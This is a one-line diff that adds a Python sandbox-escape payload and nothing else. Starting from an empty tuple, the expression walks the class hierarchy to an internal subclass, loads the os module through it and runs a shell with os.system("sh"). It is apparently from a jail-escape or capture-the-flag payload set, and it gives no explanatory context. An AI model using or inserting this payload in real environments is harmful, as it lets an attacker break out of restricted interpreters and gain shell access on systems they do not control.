@@ -1,0 +1,1 @@
+().__class__.__bases__[0].__subclasses__()[107].load_module('os').system("sh")
